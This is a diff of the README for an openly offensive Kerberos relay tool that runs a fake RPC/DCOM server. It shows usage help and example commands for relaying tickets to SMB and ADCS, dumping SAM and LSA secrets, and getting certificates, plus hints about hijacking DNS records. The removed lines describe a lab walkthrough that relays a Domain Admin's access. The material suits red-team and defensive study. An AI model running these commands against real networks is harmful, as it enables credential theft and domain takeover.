@@ -7,7 +7,7 @@
 Kerberos Relay and Forwarder for (Fake) RPC/DCOM MiTM Server  
 
 ---
-KrbRelayEx-RPC is a tool similar to my <a href=https://github.com/decoder-it/KrbRelayEx>KrbRelayEx</a> designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. <br>
+KrbRelayEx-RPC is a tool similar to my <a href=https://github.com/decoder-it/KrbRelayEx>KrbRelayEx</a> designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. <br><br>
 This version implements a fake RPC/DCOM server:<br>
 - Listens for authenticated ISystemActivator requests and extracts the AP-REQ tickets
 - Extracts dynamic port bindings from EPMAPPER/OXID resolutions
@@ -68,93 +68,79 @@ For a similar Python-based tool built on Impacket libraries, check out [krbjack]
 ## Usage  
 
 ```plaintext
-#############      KrbRelayEx by @decoder_it     ##############
-# Kerberos Relay and Forwarder for (Fake) SMB MiTM Server     #
-# v1.0 2024                                                   #
-# Github: https://github.com/decoder-it/KrbRelayEx            #
-###############################################################
+Usage:
+  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]
+
+Description:
+  KrbRelayEx-RPC is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.
+  It listens for incoming authenticated ISystemActivator requests, extracts dynamic port bindings from EPMAPPER/OXID resolutions,
+  captures the AP-REQ for accessing SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints), then dynamically
+  and transparently forwards the victim's requests to the real destination host and port
+  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired RPC/DCOM appliaction
 
 Usage:
   KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]
 
 SMB Attacks:
   -console                       Start an interactive SMB console
-  -bgconsole                     Start an interactive SMB console in the background via sockets
+  -bgconsole                     Start an interactive SMB console in background via sockets
   -list                          List available SMB shares on the target system
   -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
   -secrets                       Dump SAM & LSA secrets from the target system
 
 HTTP Attacks:
-  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., `CertSrv`)
+  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')
   -adcs <TEMPLATE>               Generate a certificate using the specified template
 
 Options:
   -redirectserver <IP>           Specify the IP address of the target server for the attack
   -ssl                           Use SSL transport for secure communication
-  -spn <SPN>                     Set the Service Principal Name (SPN) for the target service
-  -redirectports <PORTS>         Comma-separated list of additional ports to forward (e.g., `3389,135,5985`)
-  -smbport <PORT>                Specify the SMB port to listen on (default: 445)
+  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,445,5985')
+  -rpcport <PORT>                Specify the RPC port to listen on (default: 135)
 
-IMPORTANT: Ensure that you configure the entries in your hosts file to point to the actual target IP addresses!
+Examples:
+  Start an interactive SMB console:
+    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>
+
+  List SMB shares on a target:
+    KrbRelay.exe -spn CIFS/target.domain.com -list
+
+  Dump SAM & LSA secrets:
+    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>
+
+  Start a background SMB console on port 10000 upon relay:
+    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>
+
+  Generate a certificate using ADCS with a specific template:
+    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>
+
+  Relay attacks with SSL and port forwarding:
+    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver <ip_target_host> -redirectports 3389,5985,135,553,80
+
+Notes:
+  - KrbRelayEx intercepts and relays the first authentication attempt,
+    then switches to forwarder mode for all subsequent incoming requests.
+    You can press any time 'r' for restarting relay mode
+
+  - This tool is particularly effective if you can manipulate DNS names. Examples include:
+    - Being a member of the DNS Admins group.
+    - Having zones where unsecured DNS updates are allowed in Active Directory domains.
+    - Gaining control over HOSTS file entries on client computers.
+
+  - Background consoles are ideal for managing multiple SMB consoles
+
+** IMPORTANT: Ensure that you configure the entries in your hosts file to point to the actual target IP addresses!
+
 ```
 
 
 # Examples
-SMB Relay:
-==========
-The *user19* account is a member of the DnsAdmins group in the MYLAB.LOCAL domain. As a member he can modify the A record for SRV2-MYLAB and change the IP 192.168.212.11 which is our attacker machine.
-Thee *dnstool.py* script from from https://github.com/dirkjanm/krbrelayx can be used for this purpose:<br><br>
-<img width="827" alt="image" src="https://github.com/user-attachments/assets/d66e4b5d-e1c6-472c-8b40-8951d969df3a">
-<br><br>
-On the attacker machine, we launch the relay/forwarder tool. SMB consoles will be launched in the background, starting from port 10000, and we will forward all traffic for WinRM, RPC Mapper, and Remote Desktop:<br><br>
-<img width="818" alt="image" src="https://github.com/user-attachments/assets/93a31581-bd34-4d0a-8a4f-41d9bad95b2b">
-<br><br>
-A Domain Admin accesess the \\SRV2-MYLAB\c$ share without suspecting anything:
-<br><br>
-<img width="851" alt="image" src="https://github.com/user-attachments/assets/052199fc-c0ba-4505-9125-90b5b2763f16">
+<img width="754" alt="image" src="https://github.com/user-attachments/assets/6f1852f3-2c12-4493-b73f-c673b70d552c" />
 
 <br><br>
-We intercept, relay, and forward the authenticated call to the SMB server:<br><br>
-<img width="814" alt="image" src="https://github.com/user-attachments/assets/8413f774-0bb4-4cbc-998e-3581b546717e">
-<br><br>
-Finally, we gain access to the share with privileged permissions:
-<br><br>
-![image](https://github.com/user-attachments/assets/f08aa61c-0657-40c1-924f-753aebb8872b)
-
-<br><br>
-From here, we can:
-
-- Write to protected locations with Domain Admin privileges.
-- Create and start services that run under the LOCAL SYSTEM context.
- - And much more... 😉
-
-HTTP(s) ADCSRelay:
-==================
-In this case the Zone MYLAB.LOCAL has been configured with *Unsecure Updates*. Anonymous users with network access can modify DNS records!!<br><br>
-![image](https://github.com/user-attachments/assets/920947a6-aae3-47bd-83d7-91c1d05150f4)
-
-<br><br>
-
-We intercept, relay, and forward the authenticated call to the HTTP ADCS server:<br><br>
-<img width="965" alt="image" src="https://github.com/user-attachments/assets/1f859b23-1603-4eef-92b5-001b21e28624">
-
-<br><br>
-
-Administrator accesses a share of the ADCS Web Enrollment server:<br><br>
-<img width="554" alt="image" src="https://github.com/user-attachments/assets/1d07c7bc-0394-488d-a26f-51c4c926f1fe">
-<br><br>
-
-Finally, we ge a client authentication certificate on behalf the Administrator:<br><br>
-<img width="922" alt="image" src="https://github.com/user-attachments/assets/4a5795dc-4061-483e-be98-81ab5b89ef8e">
-<br><br>
-<br><br>
-Or we could install a malicious service and get a shell running as SYSTEM
-<br><br>
-![image](https://github.com/user-attachments/assets/2bd5123e-9612-44eb-a397-2e10b330e53d)
-
-<br><br>
-On an ADCS server this would allow the backup of the the CA's private/public key enabling the forging of certificates on behalf of any user.
-
+<img width="590" alt="image" src="https://github.com/user-attachments/assets/f1570a67-c99c-4c1a-a75a-4d090e8a954f" />
+<br><br>Video:<br>
+https://youtu.be/fUqCL_NtVAo
 # Installation instructions
 
 The tool has been build with .Net 8.0 Framework. The Dotnet Core runtime for Windows and GNU/Linux can be downloaded here:
